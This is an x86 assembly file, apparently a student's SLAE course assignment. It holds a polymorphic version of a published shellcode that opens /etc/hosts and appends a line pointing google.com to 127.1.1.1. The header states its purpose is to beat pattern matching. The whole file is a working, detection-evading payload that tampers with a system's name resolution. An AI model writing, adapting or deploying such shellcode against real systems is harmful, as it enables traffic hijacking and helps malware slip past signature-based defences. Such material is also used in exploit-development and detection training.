  
; SLAE - Assignment #6: Polymorphic shell code of http://shell-storm.org/shellcode/files/shellcode-893.php
; Author:  Dipsy 
; Student ID: SLAE-1535
; Purpose: The purpose of this shellcode is to beat pattern matching 

global _start

section .text

_start:
    sub edx, edx 
    sub eax, eax 

    or al, 0x5 
 
    push edx 
    push 0x7374736f     ;/etc///hosts
    mov esi, 0x97d0d0d0
    not esi 
    push esi 
    push 0x6374652f  
    push esp 
    pop ebx 
        
    or cx, 0x401    ;permmisions
    
    int 0x80        ;syscall to open file

    xchg eax, ebx
    
    push 0x4
    pop eax

    push 0x6d6f632e   ;127.1.1.1 google.com 
    push 0x656c676f
    push 0x6f672031
    push 0x2e312e31
    push 0x2e373231

    mov ecx, esp      ;let EBX point to the buffer 

    mov dl, 0x14      ;length of the buffer 
    int 0x80          ;syscall to write in the file

    sub eax, eax 
    mov al, 0x6 
    int 0x80         ;syscall to close the file

    push 0x1
    pop eax
    int 0x80         ;syscall to exit
